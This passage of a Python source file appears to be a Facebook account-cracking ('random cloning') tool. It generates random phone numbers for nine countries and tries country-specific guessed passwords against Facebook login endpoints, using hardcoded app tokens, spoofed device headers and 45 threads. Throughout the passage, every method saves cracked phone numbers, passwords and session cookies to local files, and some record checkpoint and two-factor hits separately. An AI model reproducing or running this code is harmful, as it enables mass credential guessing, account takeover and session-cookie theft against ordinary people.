                        headers = {"Accept-Encoding": "gzip, deflate","Accept": "*/*","Connection": "keep-alive","User-Agent": ua,"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32","X-FB-Friendly-Name": "authenticate","X-FB-Connection-Type": "unknown","Content-Type": "application/x-www-form-urlencoded","X-FB-HTTP-Engine": "Liger","Content-Length": "329",}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        if 'y' in show_cookies:
                                            print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        open('/sdcard/GEN-FILE-M3-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M4 GRAPH (mini) >>-------------#
def ___M_T_H_D_4___(ids,names,passlist):
        try:
                global loop,oks,cps,twf
                if not check_internet():
                    wait_for_internet()
                xp=f"{bx}[{gx}MR{bx}]{gx}"
                sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
                ua = get_ua()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        data = {"access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662","sdk_version": {random.randint(1,26)}, "email": ids,"password": pas,"sdk": "android","locale": "en_US","generate_session_cookies": "1","sig": "c1e620fa708a1d5696fb991c1bde5662"}
                        headers = {"Host": "graph.facebook.com","x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),"x-fb-sim-hni": str(random.randint(20000, 40000)),"x-fb-net-hni": str(random.randint(20000, 40000)),"x-fb-connection-quality": "EXCELLENT","user-agent":ua,"content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        uid = po['uid']
                                        year = tutulx(str(uid))
                                        print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                        if 'y' in show_cookies:
                                            print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                        os.system('espeak -a 300 "GEN,  Ok,  id"')
                                        open('/sdcard/GEN-FILE-M4-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        uid = po['error']['error_data']['uid']
                                        if 'y' in pcp:
                                            year = tutulx(str(uid))
                                            print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                            os.system('espeak -a 300 "Cp"')
                                        open('/sdcard/GEN-FILE-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> FILE METHOD M5 HOST >>-------------#
def ___M_T_H_D_5___(ids,names,passlist):
    global loop,oks,cps,twf
    if not check_internet():
        wait_for_internet()
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    session = requests.Session()
    ua = get_uaa()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Ahmed'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            ua = get_ua()
            __u_r_l__ = session.get(f'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
            data = {"m_ts": re.search(r'name="m_ts" value="(.*?)"', str(__u_r_l__)).group(1),
            "li": re.search(r'name="li" value="(.*?)"', str(__u_r_l__)).group(1),
            "try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": re.search(r'name="jazoest" value="(\d+)"', str(__u_r_l__)).group(1),"lsd": re.search(r'name="lsd" value="(.*?)"', str(__u_r_l__)).group(1)}
            headers = {"Host": "touch.facebook.com",
            "content-length": str(len((data))),
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)', str(ua)).group(1),re.search(r'Chrome/(\d+)', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search(r'name="lsd" value="(.*?)"', str(__u_r_l__)).group(1),"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
            respons = session.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False)
            ___f_u_c_k___ = session.cookies.get_dict().keys()
            if "c_user" in ___f_u_c_k___:
                coki=session.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+kuki);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-FILE-M5-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                oks.append(ids)
                break
            elif 'checkpoint' in ___f_u_c_k___:
                uid = re.findall('c_user=(.*);xs', str(session.cookies.get_dict()))[0] if 'c_user' in session.cookies.get_dict() else ids
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop+=1

#------------->> FILE METHOD M6 >>-------------#
def ___M_T_H_D_6___(ids,names,passlist):
    global loop,oks,cps,twf
    if not check_internet():
        wait_for_internet()
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    
    fn = names.split(' ')[0]
    try:
        ln = names.split(' ')[1]
    except:
        ln = fn
        
    for pw in passlist:
        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
        
        # Use Nigerian user agent
        ua = get_ua()
        
        datax = {
            'adid': str(uuid.uuid4()), 
            'format': 'json', 
            'device_id': str(uuid.uuid4()), 
            'email': ids, 
            'password': pas, 
            'generate_analytics_claims': '1', 
            'community_id': '', 
            'cpl': 'true', 
            'try_num': '1', 
            'family_device_id': str(uuid.uuid4()), 
            'credentials_type': 'password', 
            'source': 'login', 
            'error_detail_type': 'button_with_disabled', 
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        header = {
            'User-Agent': ua, 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 50000000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': random.choice(['WIFI', 'CELLULAR', 'MOBILE.4G']), 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True'
        }
        
        try:
            lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False, timeout=30).json()
            
            if 'session_key' in lo:
                cki = lo['session_cookies']
                ck = {}
                for xk in cki:
                    ck.update({xk['name']: xk['value']})
                coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
                uid = lo['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-FILE-M6-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in lo['error']['message']:
                uid = lo['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M6-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
                
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.Timeout:
            continue
        except json.JSONDecodeError:
            continue
        except Exception as e:
            continue
            
    loop += 1

#------------->> FILE METHOD M7 >>-------------#
def ___M_T_H_D_7___(ids,names,passlist):
    try:
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            ua = get_ua()
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": 'en_US',
                "client_country_code": 'US',
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            headers = {
                "Content-Type": "application/x-www-form-accencoded",
                "Host": "graph.facebook.com",
                "User-Agent": ua,
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201",
                "X-FB-Connection-Type": "unknown",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "Accept-Encoding": "gzip, deflate",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                "Connection": "Keep-Alive"
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                cookies = f"sb={ssbb};{coki}"
                uid = po['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+cookies);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-API2-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                oks.append(ids)
                break
            elif "two_factor" in str(po):
                uid = po.get('error', {}).get('error_data', {}).get('uid', ids)
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;214mGEN-2FA\x1b[1;90m]\x1b[38;5;214m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "2FA"')
                open('/sdcard/GEN-API2-2FA.txt','a').write(ids+'|'+pas+'\n')
                twf.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-API2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

#------------->> FILE METHOD M8 >>-------------#
def ___M_T_H_D_8___(ids,names,passlist):
    try:
        global loop,oks,cps,twf
        if not check_internet():
            wait_for_internet()
        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
            
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': ids,
                'password': pas,
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            
            headers = {
                'User-Agent': get_ua(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            
            q = requests.post("https://graph.facebook.com/auth/login", data=data, headers=headers, allow_redirects=False).json()
            
            if "session_key" in q:
                token = q["access_token"]
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookies = f"sb={ssbb};{coki}"
                uid = q['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+cookies);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-FILE-M8-OK-COOKIES.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                open('/sdcard/GEN-FILE-M8-TOKEN.txt','a').write(token+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in q['error']['message']:
                uid = q['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-FILE-M8-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(2)
        ___M_T_H_D_8___(ids,names,passlist)
    except Exception as e:
        pass

#------------->> RANDOM MAIN MENU >>-------------#
country_map = {'1': 'BANGLADESH','2': 'MALAYSIA','3': 'INDIA','4': 'NEPAL','5': 'PAKISTAN','6': 'AFGHANISTAN','7': 'NIGERIA','8': 'USA','9': 'INDONESIA'}
def ____R_A_N_D_O_M____():
    clear();print(f'{xd1} START BANGLADESH RANDOM CLONING ');print(f'{xd2} START MALAYSIA RANDOM CLONING ');print(f'{xd3} START INDIA RANDOM CLONING ');print(f'{xd4} START NEPAL RANDOM CLONING ');print(f'{xd5} START PAKISTAN RANDOM CLONING ');print(f'{xd6} START AFGHANISTAN RANDOM CLONING ');print(f'{xd7} START NIGERIA RANDOM CLONING ');print(f'{xd8} START UNITED STATES RANDOM CLONING ');print(f'{xd9} START INDONESIA RANDOM CLONING ');linex();___O_P_T_I_O_N___ = input(f'{xdx} SELECTION {bx}:{wx} ')
    if ___O_P_T_I_O_N___ in country_map:pookie.append(___O_P_T_I_O_N___);___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___)
    else:linex();print(f'{xd}{rx} WRONG OPTION SELECTION ');time.sleep(3);____R_A_N_D_O_M____()

def ___A_L_L_C_O_U_N_T_Y___(___O_P_T_I_O_N___):
    clear()
    if '1' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 016 {bx}|{gx} 017 {bx}|{gx} 018 {bx}|{gx} 019 ");linex()
    elif '2' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 01128 {bx}|{gx} 011** {bx}|{gx} 012** ");linex()
    elif '3' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 6383 {bx}|{gx} 8795 {bx}|{gx} 9670 {bx}|{gx} 9163 ");linex()
    elif '4' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 9840 {bx}|{gx} 9861 {bx}|{gx} 9815 {bx}|{gx} 9814 ");linex()
    elif '5' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 0318 {bx}|{gx} 0306 {bx}|{gx} 0335 {bx}|{gx} 0345 ");linex()
    elif '6' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} +9350 {bx}|{gx} +9330 {bx}|{gx} +9360 {bx}|{gx} +9340 ");linex()
    elif '7' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 070 {bx}|{gx} 080 {bx}|{gx} 081 {bx}|{gx} 091 ");linex()
    elif '8' in pookie:print(f"{xd} EXAMPLE {bx}:{gx} 941 {bx}|{gx} 816 {bx}|{gx} 308 {bx}|{gx} 225 ");linex()
    elif '9' in pookie:print(f"{xd} INPUT YOUR INDONESIA COUNTRY SIM CODE");linex()
    code = input(f'{xdx} ENTER SIM CODE {bx}:{wx} ');linex();print(f"{xd} EXAMPLE {bx}:{gx} 3000 {bx}|{gx} 5000 {bx}|{gx} 10000 {bx}|{gx} 99999 ");linex();limit=int(input(f'{xdx} ENTER LIMIT {bx}:{wx} '))
    clear();print(f'{xd1} METHOD {wx}~{gx} M1');print(f'{xd2} METHOD {wx}~{gx} M2');print(f'{xd3} METHOD {wx}~{gx} M3');print(f'{xd4} METHOD {wx}~{gx} M4');print(f'{xd5} METHOD {wx}~{gx} M5');print(f'{xd6} METHOD {wx}~{gx} M6');print(f'{xd7} METHOD {wx}~{gx} M7');print(f'{xd8} METHOD {wx}~{gx} M8');linex();___M_T_D___ = input(f'{xd} ENTER METHOD {bx}:{wx} ')
    clear();___S_P___ = input(f'{xd} DO YOU WANT SHOW CP UID {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___S_P___ in ['y','Y','yes','Yes','1']:pcp.append('y')
    else:pcp.append('n')
    clear();___C_O_O_K_I_E_S___ = input(f'{xd} DO YOU WANT SHOW COOKIES {bx}:{wx} {wx}({gx}y{bx}/{rx}n{wx}) ')
    if ___C_O_O_K_I_E_S___ in ['y','Y','yes','Yes','1']:show_cookies.append('y')
    else:show_cookies.append('n')
    for nmbr in range(int(limit)):
        if "1" in pookie:numberx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberx)
        elif "2" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(numberxx)
        elif "3" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "4" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(6));user.append(numberxx)
        elif "5" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "6" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(7));user.append(numberxx)
        elif "7" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
        elif "8" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
        elif "9" in pookie:numberxx = ''.join(random.choice(string.digits) for _ in range(8));user.append(numberxx)
    with tred(max_workers=45) as ___P_R_O___:
        clear();tl = str(len(user))
        country_name = country_map.get(___O_P_T_I_O_N___, "UNKNOWN")
        print(f'{xd} OPERATOR{bx}|{gx}LIMIT{bx}|{gx}METHOD {bx}:{wx} {code}{bx}|{wx}{tl}{bx}|{wx}M{___M_T_D___}\n{xd} CLONING COUNTRY {bx}:{wx} {country_name}');print (f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ');linex()
        for love in user:
            ids = code + love
            if "1" in pookie:passlist=[ids,love,ids[:6],ids[:7],ids[:8],ids[5:]]
            elif "2" in pookie:passlist=[ids,love,ids[:7],ids[:6],ids[:8]]
            elif "3" in pookie:passlist=[ids,love,ids[:6],"57273200","57575751","59039200"]
            elif "4" in pookie:passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
            elif "5" in pookie:passlist=[ids,love,ids[5:],'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            elif "6" in pookie:passlist=[love,ids,'afghan','afghan12345','Afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786','50006000']
            elif "7" in pookie:passlist=[ids,love,ids[:8],ids[:7],ids[:9],ids[:11],ids[:6],ids[:10],"111111","112233","1234567","123123","emmanuel","12345678","abubakar","123456789","adebayo"]
            elif "8" in pookie:passlist=[ids,love,"500500","200200"]
            elif "9" in pookie:passlist=[ids,love,"indonesia","200200","first123","first12"]
            if ___M_T_D___ in ['1']:___P_R_O___.submit(____M_E_T_H_O_D_A____,ids,passlist,tl)
            elif ___M_T_D___ in ['2']:___P_R_O___.submit(____M_E_T_H_O_D_B____,ids,passlist,tl)
            elif ___M_T_D___ in ['3']:___P_R_O___.submit(____M_E_T_H_O_D_C____,ids,passlist,tl)
            elif ___M_T_D___ in ['4']:___P_R_O___.submit(____M_E_T_H_O_D_D____,ids,passlist,tl)
            elif ___M_T_D___ in ['5']:___P_R_O___.submit(____M_E_T_H_O_D_E____,ids,passlist,tl)
            elif ___M_T_D___ in ['6']:___P_R_O___.submit(____M_E_T_H_O_D_F____,ids,passlist,tl)
            elif ___M_T_D___ in ['7']:___P_R_O___.submit(____M_E_T_H_O_D_G____,ids,passlist,tl) 
            elif ___M_T_D___ in ['8']:___P_R_O___.submit(____M_E_T_H_O_D_H____,ids,passlist,tl) 
